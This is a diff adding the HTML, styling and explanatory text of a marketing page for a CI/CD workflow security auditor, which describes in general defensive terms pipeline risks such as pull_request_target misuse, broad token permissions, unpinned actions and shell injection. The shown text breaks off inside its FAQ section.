@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <!-- Preconnect to Google Tag Manager for Maximum Performance -->
+  <link rel="preconnect" href="https://www.googletagmanager.com">
+  <link rel="dns-prefetch" href="https://www.googletagmanager.com">
+
+  <!-- Google Tag Manager -->
+  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+  })(window,document,'script','dataLayer','GTM-MMCFLS3D');</script>
+  <!-- End Google Tag Manager -->
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CI/CD Security Auditor & Pipeline Secret Leak Detector | TAVARDT United States</title>
+  <meta name="description" content="Audit the security of your CI/CD workflows (GitHub Actions, GitLab CI). Detect excessive write-all permissions, dangerous pull_request_target triggers, unpinned actions, and corporate secret exposure.">
+  <link rel="icon" type="image/x-icon" href="./favicon.ico">
+  <link rel="shortcut icon" href="./favicon.ico">
+  <link rel="canonical" href="https://tavardt-usa.github.io/ci-cd-security-auditor-us/">
+  <link rel="alternate" hreflang="pt-BR" href="https://tavardt-brasil.github.io/ci-cd-security-auditor-br/">
+  <link rel="alternate" hreflang="pt-PT" href="https://tavardt-portugal.github.io/ci-cd-security-auditor-pt/">
+  <link rel="alternate" hreflang="en-US" href="https://tavardt-usa.github.io/ci-cd-security-auditor-us/">
+  <link rel="alternate" hreflang="en-GB" href="https://tavardt-uk.github.io/ci-cd-security-auditor-uk/">
+  <link rel="alternate" hreflang="en-CA" href="https://tavardt-canada.github.io/ci-cd-security-auditor-ca/">
+  <link rel="alternate" hreflang="en-AU" href="https://tavardt-australia.github.io/ci-cd-security-auditor-au/">
+  <link rel="alternate" hreflang="en-NZ" href="https://tavardt-new-zealand.github.io/ci-cd-security-auditor-nz/">
+  <link rel="alternate" hreflang="es-ES" href="https://tavardt-espana.github.io/ci-cd-security-auditor-es/">
+  <link rel="alternate" hreflang="es-MX" href="https://tavardt-mexico.github.io/ci-cd-security-auditor-mx/">
+  <link rel="alternate" hreflang="fr-FR" href="https://tavardt-france.github.io/ci-cd-security-auditor-fr/">
+  <link rel="alternate" hreflang="it-IT" href="https://tavardt-italia.github.io/ci-cd-security-auditor-it/">
+  <link rel="alternate" hreflang="x-default" href="https://tavardt-usa.github.io/ci-cd-security-auditor-us/">
+  <meta name="robots" content="index, follow">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="TAVARDT">
+  <meta property="og:title" content="CI/CD Security Auditor & Pipeline Secret Leak Detector | TAVARDT United States">
+  <meta property="og:description" content="Audit the security of your CI/CD workflows (GitHub Actions, GitLab CI). Detect excessive write-all permissions, dangerous pull_request_target triggers, unpinned actions, and corporate secret exposure.">
+  <meta property="og:url" content="https://tavardt-usa.github.io/ci-cd-security-auditor-us/">
+  <meta property="og:image" content="https://tavardt-usa.github.io/ci-cd-security-auditor-us/og-image.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:alt" content="TAVARDT United States">
+  <meta property="og:locale" content="en_US">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@tavardt">
+  <meta name="twitter:title" content="CI/CD Security Auditor & Pipeline Secret Leak Detector | TAVARDT United States">
+  <meta name="twitter:description" content="Audit the security of your CI/CD workflows (GitHub Actions, GitLab CI). Detect excessive write-all permissions, dangerous pull_request_target triggers, unpinned actions, and corporate secret exposure.">
+  <meta name="twitter:image" content="https://tavardt-usa.github.io/ci-cd-security-auditor-us/og-image.jpg">
+
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebApplication",
+      "@id": "https://tavardt-usa.github.io/ci-cd-security-auditor-us/#webapp",
+      "url": "https://tavardt-usa.github.io/ci-cd-security-auditor-us/",
+      "name": "CI/CD Security Auditor & Pipeline Secret Leak Detector | TAVARDT United States",
+      "applicationCategory": "SecurityApplication",
+      "operatingSystem": "All",
+      "browserRequirements": "Requires JavaScript. Requires HTML5.",
+      "description": "Audit the security of your CI/CD workflows (GitHub Actions, GitLab CI). Detect excessive write-all permissions, dangerous pull_request_target triggers, unpinned actions, and corporate secret exposure.",
+      "offers": {
+        "@type": "Offer",
+        "price": "0",
+        "priceCurrency": "USD"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "TAVARDT",
+        "url": "https://ag.tavardt.com/us/",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://tavardt-usa.github.io/ci-cd-security-auditor-us/favicon.ico"
+        }
+      }
+    },
+    {
+      "@type": "BreadcrumbList",
+      "@id": "https://tavardt-usa.github.io/ci-cd-security-auditor-us/#breadcrumb",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "TAVARDT",
+          "item": "https://ag.tavardt.com/us/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Tools Center",
+          "item": "https://tools.tavardt.com/us/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "CI/CD Security Auditor & Pipeline Secret Leak Detector",
+          "item": "https://tavardt-usa.github.io/ci-cd-security-auditor-us/"
+        }
+      ]
+    },
+    {
+      "@type": "FAQPage",
+      "@id": "https://tavardt-usa.github.io/ci-cd-security-auditor-us/#faq",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "How do attackers exploit CI/CD workflows to harvest corporate secrets?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Attackers leverage compromised developer credentials or malicious pull requests to trigger arbitrary command execution within build runners, extracting environment variables, cloud tokens (AWS, GCP, Azure), and deployment credentials."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Why is pull_request_target classified as a critical risk in public repositories?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "The pull_request_target event runs with repository write permissions and access to repository secrets. If the workflow checks out untrusted pull request code without strict sandboxing, attackers gain privileged execution."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What is the Zero Trust best practice for GITHUB_TOKEN permissions?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "The mandatory posture is defining minimal permissions at the root level (permissions: read-all or contents: read) and elevating specific write scopes only within isolated jobs that strictly require them."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Why is referencing GitHub Actions by version tag (@v3) risky compared to commit SHAs?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Git tags are mutable pointers that can be rewritten if an upstream action repository or developer account is breached. Pinning by full 40-character commit SHA provides cryptographic immutability."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "How does TAVARDT assist organizations in hardening automated CI/CD pipelines?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "TAVARDT provides architectural hardening, OpenID Connect (OIDC) implementation to eliminate long-lived cloud credentials, ephemeral isolated runners, and automated supply chain defense."
+          }
+        }
+      ]
+    }
+  ]
+}
+  </script>
+
+  <style id="tavardt-unified-enterprise-css">
+  /* ==========================================================================
+     TAVARDT UNIFIED ENTERPRISE DESIGN SYSTEM (ASTRYX / AG-ONE TOKENS)
+     ========================================================================== */
+  :root {
+    --bg: #050510 !important;
+    --bg2: #0b101e !important;
+    --bg3: #111827 !important;
+    --card-bg: #0b101e !important;
+    --surface: #0b101e !important;
+    --surface-card: #0e1526 !important;
+    --surface-elevated: #131d33 !important;
+    --border: rgba(255, 255, 255, 0.08) !important;
+    --accent: #1e00ff !important;
+    --accent-hover: #1500db !important;
+    --green: #00ff88 !important;
+    --red: #f85149 !important;
+    --yellow: #e3b341 !important;
+    --text: #f8fafc !important;
+    --text-muted: #94a3b8 !important;
+    --radius: 12px;
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    background-color: #050510 !important;
+    color: #f8fafc !important;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
+    min-height: 100vh !important;
+    line-height: 1.6 !important;
+    -webkit-font-smoothing: antialiased !important;
+  }
+
+  header.tavardt-header {
+    width: 100% !important;
+    display: block !important;
+    background: rgba(5, 5, 16, 0.95) !important;
+    backdrop-filter: blur(16px) !important;
+    -webkit-backdrop-filter: blur(16px) !important;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08) !important;
+    position: sticky !important;
+    top: 0 !important;
+    left: 0 !important;
+    right: 0 !important;
+    z-index: 1000 !important;
+    padding: 0 !important;
+    margin: 0 !important;
+    box-sizing: border-box !important;
+  }
+  .tavardt-header-inner {
+    width: 100% !important;
+    max-width: 1200px !important;
+    margin: 0 auto !important;
+    padding: 16px 32px !important;
+    display: flex !important;
+    justify-content: space-between !important;
+    align-items: center !important;
+    box-sizing: border-box !important;
+  }
+  .tavardt-brand {
+    display: inline-flex !important;
+    align-items: center !important;
+    gap: 12px !important;
+    text-decoration: none !important;
+    color: #ffffff !important;
+    margin: 0 !important;
+  }
+  .tavardt-logo-text {
+    font-size: 1.35rem !important;
+    font-weight: 800 !important;
+    letter-spacing: -0.03em !important;
+    color: #ffffff !important;
+  }
+  .tavardt-brand-dot { color: #839bc8 !important; }
+  .tavardt-badge-jurisdiction {
+    font-size: 0.75rem !important;
+    font-weight: 600 !important;
+    color: #94a3b8 !important;
+    padding: 3px 12px !important;
+    background: rgba(255, 255, 255, 0.05) !important;
+    border: 1px solid rgba(255, 255, 255, 0.1) !important;
+    border-radius: 9999px !important;
+    text-transform: uppercase !important;
+    letter-spacing: 0.05em !important;
+  }
+  .tavardt-nav {
+    display: flex !important;
+    align-items: center !important;
+    gap: 24px !important;
+    margin: 0 !important;
+  }
+  .tavardt-nav-link {
+    color: #94a3b8 !important;
+    text-decoration: none !important;
+    font-size: 0.88rem !important;
+    font-weight: 500 !important;
+    transition: color 0.2s ease !important;
+  }
+  .tavardt-nav-link:hover { color: #ffffff !important; }
+
+  .tavardt-hero {
+    width: 100% !important;
+    max-width: 1200px !important;
+    margin: 0 auto !important;
+    padding: 48px 32px 28px !important;
+    text-align: center !important;
+    box-sizing: border-box !important;
+    background: transparent !important;
+    border: none !important;
+  }
+  .tavardt-hero h1 {
+    font-size: clamp(1.8rem, 4vw, 2.6rem) !important;
+    font-weight: 800 !important;
+    letter-spacing: -0.03em !important;
+    margin: 0 0 12px 0 !important;
+    color: #ffffff !important;
+    line-height: 1.2 !important;
+    text-align: center !important;
+  }
+  .tavardt-hero h1 span { color: #ffffff !important; }
+  .tavardt-hero p {
+    font-size: 1.05rem !important;
+    color: #94a3b8 !important;
+    max-width: 840px !important;
+    margin: 0 auto !important;
+    line-height: 1.6 !important;
+  }
+
+  main {
+    width: 100% !important;
+    max-width: 1200px !important;
+    margin: 0 auto !important;
+    padding: 24px 32px 48px !important;
+    box-sizing: border-box !important;
+  }
+  .card {
+    width: 100% !important;
+    background: var(--surface-card) !important;
+    border: 1px solid var(--border) !important;
+    border-radius: 16px !important;
+    padding: 36px 32px !important;
+    margin-bottom: 32px !important;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4) !important;
+    box-sizing: border-box !important;
+  }
+  .card h2 {
+    font-size: 1.25rem !important;
+    font-weight: 700 !important;
+    margin-bottom: 20px !important;
+    color: #ffffff !important;
+    text-align: center !important;
+  }
+
+  .template-selector {
+    display: flex !important;
+    gap: 10px !important;
+    margin-bottom: 16px !important;
+    flex-wrap: wrap !important;
+    justify-content: center !important;
+  }
+  .btn-template {
+    background: var(--bg2) !important;
+    color: var(--text-muted) !important;
+    border: 1px solid var(--border) !important;
+    padding: 8px 16px !important;
+    border-radius: 9999px !important;
+    font-size: 0.82rem !important;
+    cursor: pointer !important;
+    font-weight: 600 !important;
+    transition: all 0.2s ease !important;
+  }
+  .btn-template:hover {
+    background: var(--surface-elevated) !important;
+    color: #ffffff !important;
+    border-color: rgba(30, 0, 255, 0.4) !important;
+  }
+  textarea.code-editor {
+    width: 100% !important;
+    min-height: 240px !important;
+    background: var(--bg) !important;
+    border: 1px solid var(--border) !important;
+    border-radius: var(--radius) !important;
+    color: #cbd5e1 !important;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace !important;
+    font-size: 0.9rem !important;
+    padding: 18px 20px !important;
+    line-height: 1.5 !important;
+    resize: vertical !important;
+    outline: none !important;
+    box-sizing: border-box !important;
+    transition: border-color 0.2s, box-shadow 0.2s !important;
+    margin-bottom: 20px !important;
+  }
+  textarea.code-editor:focus {
+    border-color: #1e00ff !important;
+    box-shadow: 0 0 20px rgba(30, 0, 255, 0.3) !important;
+  }
+
+  button.btn-primary {
+    cursor: pointer !important;
+    background: #1e00ff !important;
+    color: #ffffff !important;
+    border: none !important;
+    border-radius: 9999px !important;
+    font-size: 0.95rem !important;
+    font-weight: 700 !important;
+    padding: 16px 36px !important;
+    box-shadow: 0 0 30px rgba(30, 0, 255, 0.6) !important;
+    transition: all 0.3s !important;
+    white-space: nowrap !important;
+    display: inline-block !important;
+  }
+  button.btn-primary:hover {
+    background: #1500db !important;
+    box-shadow: 0 0 40px rgba(30, 0, 255, 0.9) !important;
+    transform: translateY(-2px) !important;
+  }
+
+  .progress-wrap { display: none; margin: 24px 0; }
+  .progress-bar-bg { background: var(--bg); height: 8px; border-radius: 4px; overflow: hidden; }
+  .progress-bar-fill { background: linear-gradient(90deg, #1e00ff, #00ff88); height: 100%; width: 0%; transition: width 0.4s ease; }
+  .progress-status { font-size: 0.85rem; color: var(--text-muted); margin-top: 8px; text-align: center; font-family: monospace; }
+
+  #results-container { display: none; width: 100% !important; }
+  .gauge-wrap {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin: 24px 0 32px;
+  }
+  .gauge-ring {
+    position: relative;
+    width: 160px;
+    height: 160px;
+  }
+  .gauge-ring svg { transform: rotate(-90deg); }
+  .gauge-ring circle {
+    fill: none;
+    stroke-width: 14;
+    stroke-linecap: round;
+    transition: stroke-dashoffset 1s ease, stroke 0.5s;
+  }
+  .gauge-bg { stroke: var(--bg); }
+  .gauge-fg { stroke: var(--green); }
+  .gauge-num {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+  }
+  .gauge-num .score { font-size: 2.6rem; font-weight: 800; line-height: 1; }
+  .gauge-num .label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; }
+  .score-verdict { font-size: 1.1rem; font-weight: 700; margin-top: 12px; text-align: center; }
+
+  .findings-header h2 { text-align: center !important; font-size: 1.25rem !important; margin-bottom: 20px !important; }
+  .findings-grid { display: grid; gap: 16px; margin-top: 24px; width: 100%; }
+  .finding-card {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 20px;
+    display: flex;
+    gap: 16px;
+    align-items: flex-start;
+  }
+  .finding-card.CRITICAL { border-color: var(--red); }
+  .finding-card.HIGH { border-color: var(--yellow); }
+  .finding-card.MEDIUM { border-color: var(--yellow); }
+  .finding-card.LOW { border-color: #3b82f6; }
+  .finding-card.CLEAN { border-color: var(--green); }
+  .finding-badge {
+    font-size: 0.75rem;
+    font-weight: 800;
+    padding: 4px 10px;
+    border-radius: 9999px;
+    text-transform: uppercase;
+    flex-shrink: 0;
+  }
+  .CRITICAL .finding-badge { background: rgba(248, 81, 73, 0.2); color: var(--red); }
+  .HIGH .finding-badge { background: rgba(227, 179, 65, 0.2); color: var(--yellow); }
+  .MEDIUM .finding-badge { background: rgba(227, 179, 65, 0.2); color: var(--yellow); }
+  .LOW .finding-badge { background: rgba(59, 130, 246, 0.2); color: #60a5fa; }
+  .CLEAN .finding-badge { background: rgba(0, 255, 136, 0.2); color: var(--green); }
+  .finding-body { flex: 1; }
+  .finding-title { font-size: 0.98rem; font-weight: 700; margin-bottom: 4px; }
+  .finding-desc { font-size: 0.88rem; color: var(--text-muted); line-height: 1.5; }
+  .finding-evidence { background: #000000; border-radius: 6px; padding: 8px 12px; margin-top: 8px; font-family: monospace; font-size: 0.8rem; color: #a5b4fc; word-break: break-all; }
+
+  .cta-card {
+    width: 100% !important;
+    background: linear-gradient(135deg, rgba(30, 0, 255, 0.2) 0%, rgba(11, 16, 30, 0.9) 100%);
+    border: 1px solid rgba(30, 0, 255, 0.4);
+    border-radius: 16px;
+    padding: 36px 32px;
+    text-align: center;
+    margin-top: 32px;
+    box-sizing: border-box !important;
+  }
+  .cta-card h3 { font-size: 1.35rem; font-weight: 800; margin-bottom: 10px; color: #ffffff; text-align: center; }
+  .cta-card p { color: var(--text-muted); max-width: 720px; margin: 0 auto 24px; font-size: 0.98rem; text-align: center; }
+  .cta-btns { display: flex; gap: 16px; justify-content: center; flex-wrap: wrap; }
+  .btn-wa {
+    background: #1e00ff;
+    color: #ffffff;
+    text-decoration: none;
+    font-weight: 700;
+    padding: 14px 32px;
+    border-radius: 9999px;
+    box-shadow: 0 0 25px rgba(30, 0, 255, 0.6);
+    transition: all 0.2s;
+  }
+  .btn-wa:hover { transform: translateY(-2px); box-shadow: 0 0 35px rgba(30, 0, 255, 0.9); }
+  .btn-corp {
+    background: var(--bg2);
+    color: var(--text);
+    text-decoration: none;
+    font-weight: 600;
+    padding: 14px 28px;
+    border-radius: 9999px;
+    border: 1px solid var(--border);
+  }
+
+  .aeo-card {
+    width: 100% !important;
+    background: var(--surface-card);
+    border: 1px solid rgba(30, 0, 255, 0.3);
+    border-left: 4px solid #1e00ff;
+    border-radius: 16px;
+    padding: 28px 32px;
+    margin-bottom: 32px;
+    box-sizing: border-box !important;
+  }
+  .aeo-card h2 {
+    font-size: 1.2rem;
+    color: #ffffff;
+    margin-bottom: 12px;
+    font-weight: 700;
+    text-align: center;
+  }
+  .aeo-card p {
+    font-size: 0.98rem;
+    color: #cbd5e1;
+    line-height: 1.7;
+  }
+
+  .vectors-section {
+    width: 100% !important;
+    margin-bottom: 36px;
+    box-sizing: border-box !important;
+  }
+  .vectors-section h2 {
+    font-size: 1.25rem;
+    color: #ffffff;
+    margin-bottom: 18px;
+    font-weight: 700;
+    text-align: center;
+  }
+  .vectors-grid {
+    display: grid !important;
+    grid-template-columns: repeat(2, 1fr) !important;
+    gap: 20px !important;
+    width: 100% !important;
+    box-sizing: border-box !important;
+  }
+  @media (max-width: 768px) {
+    .vectors-grid {
+      grid-template-columns: 1fr !important;
+      gap: 16px !important;
+    }
+  }
+  .vector-card {
+    background: linear-gradient(145deg, rgba(14, 21, 38, 0.75) 0%, rgba(9, 14, 26, 0.95) 100%) !important;
+    border: 1px solid rgba(255, 255, 255, 0.08) !important;
+    border-radius: 14px !important;
+    padding: 24px 28px !important;
+    box-sizing: border-box !important;
+    display: flex !important;
+    flex-direction: column !important;
+    justify-content: flex-start !important;
+    transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease !important;
+    position: relative !important;
+    overflow: hidden !important;
+  }
+  .vector-card::before {
+    content: '' !important;
+    position: absolute !important;
+    top: 0 !important;
+    left: 0 !important;
+    width: 4px !important;
+    height: 100% !important;
+    background: linear-gradient(180deg, #1e00ff 0%, rgba(30, 0, 255, 0.2) 100%) !important;
+    border-radius: 4px 0 0 4px !important;
+  }
+  .vector-card:hover {
+    transform: translateY(-2px) !important;
+    border-color: rgba(30, 0, 255, 0.4) !important;
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4), 0 0 15px rgba(30, 0, 255, 0.15) !important;
+  }
+  .vector-title {
+    font-size: 1.05rem !important;
+    font-weight: 700 !important;
+    color: #ffffff !important;
+    margin: 0 0 10px 0 !important;
+    line-height: 1.4 !important;
+  }
+  .vector-desc {
+    font-size: 0.92rem !important;
+    color: #94a3b8 !important;
+    line-height: 1.6 !important;
+    margin: 0 !important;
+  }
+
+  .faq-section {
+    width: 100% !important;
+    margin-bottom: 36px;
+    box-sizing: border-box !important;
+  }
+  .faq-section h2 {
+    font-size: 1.25rem;
+    color: #ffffff;
+    margin-bottom: 18px;
+    font-weight: 700;
+    text-align: center;
+  }
+  .faq-item {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    margin-bottom: 14px;
+    padding: 18px 24px;
+    transition: border-color 0.2s;
+  }
+  .faq-item[open] { border-color: rgba(30, 0, 255, 0.4); }
+  .faq-question {
+    cursor: pointer;
+    font-weight: 600;
+    font-size: 0.96rem;
+    color: #ffffff;
+    outline: none;
+  }
+  .faq-answer {
+    margin-top: 12px;
+    font-size: 0.92rem;
+    color: var(--text-muted);
+    line-height: 1.6;
+    border-top: 1px solid rgba(255, 255, 255, 0.05);
+    padding-top: 12px;
+  }
+
+  .tavardt-footer {
+    width: 100% !important;
+    background: #050510 !important;
+    border-top: 1px solid rgba(255, 255, 255, 0.08) !important;
+    margin-top: 56px !important;
+    color: #94a3b8 !important;
+  }
+  .tavardt-footer-inner {
+    max-width: 1200px !important;
+    margin: 0 auto !important;
+    padding: 48px 32px 32px !important;
+    display: grid !important;
+    grid-template-columns: 2fr 1fr 1.5fr !important;
+    gap: 40px !important;
+    box-sizing: border-box !important;
+  }
+  @media (max-width: 768px) {
+    .tavardt-footer-inner {
+      grid-template-columns: 1fr !important;
+      gap: 28px !important;
+      padding: 36px 20px 24px !important;
+    }
+    .tavardt-header-inner, .tavardt-hero, main {
+      padding-left: 20px !important;
+      padding-right: 20px !important;
+    }
+  }
+  .tavardt-footer-logo {
+    font-size: 1.4rem !important;
+    font-weight: 800 !important;
+    color: #ffffff !important;
+    margin-bottom: 12px !important;
+    letter-spacing: -0.03em !important;
+  }
+  .tavardt-footer-mission {
+    font-size: 0.88rem !important;
+    line-height: 1.6 !important;
+    color: #94a3b8 !important;
+    margin-bottom: 16px !important;
+    max-width: 440px !important;
+  }
+  .tavardt-footer-jurisdiction-tag {
+    display: inline-block !important;
+    font-size: 0.78rem !important;
+    color: #c7d2fe !important;
+    background: rgba(30, 0, 255, 0.12) !important;
+    border: 1px solid rgba(30, 0, 255, 0.3) !important;
+    padding: 4px 12px !important;
+    border-radius: 9999px !important;
+  }
+  .tavardt-footer-heading {
+    font-size: 0.82rem !important;
+    font-weight: 700 !important;
+    text-transform: uppercase !important;
+    letter-spacing: 0.08em !important;
+    color: #ffffff !important;
+    margin-bottom: 16px !important;
+  }
+  .tavardt-footer-links {
+    list-style: none !important;
+    padding: 0 !important;
+    margin: 0 !important;
+    display: flex !important;
+    flex-direction: column !important;
+    gap: 10px !important;
+  }
+  .tavardt-footer-links a {
+    color: #94a3b8 !important;
+    text-decoration: none !important;
+    font-size: 0.88rem !important;
+    transition: color 0.2s ease !important;
+  }
+  .tavardt-footer-links a:hover { color: #839bc8 !important; }
+  .tavardt-footer-compliance-text {
+    font-size: 0.85rem !important;
+    line-height: 1.6 !important;
+    color: #94a3b8 !important;
+  }
+  .tavardt-footer-bottom {
+    max-width: 1200px !important;
+    margin: 0 auto !important;
+    padding: 20px 32px !important;
+    border-top: 1px solid rgba(255, 255, 255, 0.05) !important;
+    text-align: center !important;
+    font-size: 0.82rem !important;
+    color: #64748b !important;
+    box-sizing: border-box !important;
+  }
+  </style>
+</head>
+<body>
+
+<header class="tavardt-header">
+  <div class="tavardt-header-inner">
+    <a href="https://ag.tavardt.com/us/" class="tavardt-brand" target="_blank" rel="noopener">
+      <span class="tavardt-logo-text">TAVARDT<span class="tavardt-brand-dot">.</span></span>
+      <span class="tavardt-badge-jurisdiction">United States</span>
+    </a>
+    <nav class="tavardt-nav">
+      <a href="https://ag.tavardt.com/us/" class="tavardt-nav-link" target="_blank" rel="noopener">Portal</a>
+      <a href="https://tools.tavardt.com/us/" class="tavardt-nav-link" target="_blank" rel="noopener">Tools Center</a>
+      <a href="https://ag.tavardt.com/us/contato/" class="tavardt-nav-link" target="_blank" rel="noopener">Contact</a>
+    </nav>
+  </div>
+</header>
+
+<section class="tavardt-hero">
+  <h1>Security Auditor for <span>CI/CD Pipelines</span> & Workflows</h1>
+  <p>Paste your GitHub Actions YAML manifest or select a test template to audit GITHUB_TOKEN permissions, injection triggers, and corporate secret exposure.</p>
+</section>
+
+<main>
+  <div class="card">
+    <h2>Workflow YAML Manifest (.github/workflows/*.yml):</h2>
+    <div class="template-selector">
+      <button type="button" class="btn-template" onclick="loadSample('vulnerable')">Example: Vulnerable Pipeline (Secret Leakage)</button>
+      <button type="button" class="btn-template" onclick="loadSample('hardened')">Example: Hardened Pipeline (Zero Trust)</button>
+      <button type="button" class="btn-template" onclick="loadSample('clear')">Clear Editor</button>
+    </div>
+    <textarea id="yamlInput" class="code-editor" placeholder="name: CI Workflow&#10;on: [push, pull_request]&#10;jobs:&#10;  build:&#10;    runs-on: ubuntu-latest&#10;    steps:&#10;      - uses: actions/checkout@v3&#10;..."></textarea>
+    <div style="text-align: center;">
+      <button class="btn-primary" id="btnAudit" onclick="startAudit()">Audit Workflow Security</button>
+    </div>
+
+    <div class="progress-wrap" id="progressWrap">
+      <div class="progress-bar-bg">
+        <div class="progress-bar-fill" id="progressFill"></div>
+      </div>
+      <div class="progress-status" id="progressStatus">Mapping event triggers and execution context (on:)...</div>
+    </div>
+  </div>
+
+  <div id="results-container">
+    <div class="card">
+      <div class="gauge-wrap">
+        <div class="gauge-ring">
+          <svg width="160" height="160">
+            <circle class="gauge-bg" cx="80" cy="80" r="66"></circle>
+            <circle class="gauge-fg" id="gaugeFg" cx="80" cy="80" r="66" stroke-dasharray="414.69" stroke-dashoffset="414.69"></circle>
+          </svg>
+          <div class="gauge-num">
+            <div class="score" id="scoreNum">0</div>
+            <div class="label">Score / 100</div>
+          </div>
+        </div>
+        <div class="score-verdict" id="scoreVerdict">Pipeline Compliant with Zero Trust Best Practices</div>
+      </div>
+
+      <div class="findings-header">
+        <h2>Vulnerabilities and Security Findings</h2>
+      </div>
+
+      <div class="findings-grid" id="findingsGrid"></div>
+
+      <div class="cta-card">
+        <h3>Need Continuous Pipeline Hardening & Secret Protection?</h3>
+        <p>TAVARDT cybersecurity and engineering specialists implement secret isolation, Zero Trust runner architecture, and continuous supply chain governance.</p>
+        <div class="cta-btns">
+          <a class="btn-wa" id="waBtn" href="https://wa.me/5584987721775" target="_blank">Talk to Sofia (WhatsApp)</a>
+          <a class="btn-corp" href="https://ag.tavardt.com/us/ciberseguranca/" target="_blank" rel="noopener">Explore Cybersecurity Services</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <section class="aeo-card">
+    <h2>What is the TAVARDT CI/CD Security Auditor?</h2>
+    <p>The TAVARDT CI/CD Security Auditor is a static defensive tool engineered to inspect continuous integration manifests (GitHub Actions, GitLab CI) and identify critical software supply chain risk vectors documented in the OWASP Top 10 for CI/CD Security. The tool evaluates high-privilege triggers (pull_request_target), unrestricted GITHUB_TOKEN permissions (write-all), shell injection vulnerabilities caused by direct context expression interpolation in run: blocks, and dependencies pinned to mutable Git tags instead of immutable commit SHAs.</p>
+  </section>
+
+  <section class="vectors-section">
+    <h2>Key Risk Vectors and Secret Leakage in CI/CD Pipelines</h2>
+    <div class="vectors-grid">
+      <div class="vector-card">
+        <h3 class="vector-title">pull_request_target with Insecure Checkout</h3>
+        <p class="vector-desc">The pull_request_target trigger executes within the base repository context and possesses access to production secrets. Checking out code from untrusted forks enables immediate authenticated remote code execution.</p>
+      </div>
+      <div class="vector-card">
+        <h3 class="vector-title">Unrestricted write-all Permissions</h3>
+        <p class="vector-desc">When permissions are not explicitly restricted, the default GITHUB_TOKEN inherits write access across releases, packages, and code, allowing attackers to poison deployment artifacts.</p>
+      </div>
+      <div class="vector-card">
+        <h3 class="vector-title">Actions Pinned to Mutable Tags</h3>
+        <p class="vector-desc">Referencing third-party actions by mutable tags (such as @v3 or @main) exposes the pipeline to supply chain attacks should a maintainer account become compromised.</p>
+      </div>
+      <div class="vector-card">
+        <h3 class="vector-title">Shell Command Injection in Run Blocks</h3>
+        <p class="vector-desc">Interpolating untrusted context variables like ${{ github.event.issue.title }} directly into shell script execution blocks allows syntax breakout and direct remote command execution on the runner.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="faq-section">
+    <h2>Frequently Asked Questions (FAQ) & Security Guidelines</h2>
+    <details class="faq-item">
+      <summary class="faq-question">How do attackers exploit CI/CD workflows to harvest corporate secrets?</summary>
+      <div class="faq-answer">Attackers leverage compromised developer credentials or malicious pull requests to trigger arbitrary command execution within build runners, extracting environment variables, cloud tokens (AWS, GCP, Azure), and deployment credentials.</div>
+    </details>
+    <details class="faq-item">
+      <summary class="faq-question">Why is pull_request_target classified as a critical risk in public repositories?</summary>
+      <div class="faq-answer">The pull_request_target event runs with repository write permissions and access to repository secrets. If the workflow checks out untrusted pull request code without strict sandboxing, attackers gain privileged execution.</div>
+    </details>
+    <details class="faq-item">
+      <summary class="faq-question">What is the Zero Trust best practice for GITHUB_TOKEN permissions?</summary>
+      <div class="faq-answer">The mandatory posture is defining minimal permissions at the root level (permissions: read-all or contents: read) and elevating specific write scopes only within isolated jobs that strictly require them.</div>
+    </details>
+    <details class="faq-item">
+      <summary class="faq-question">Why is referencing GitHub Actions by version tag (@v3) risky compared to commit SHAs?</summary>
+      <div class="faq-answer">Git tags are mutable pointers that can be rewritten if an upstream action repository or developer account is breached. Pinning by full 40-character commit SHA provides cryptographic immutability.</div>
+    </details>
+    <details class="faq-item">
+      <summary class="faq-question">How does TAVARDT assist organizations in hardening automated CI/CD pipelines?</summary>
+      <div class="faq-answer">TAVARDT provides architectural hardening, OpenID Connect (OIDC) implementation to eliminate long-lived cloud credentials, ephemeral isolated runners, and automated supply chain defense.</div>
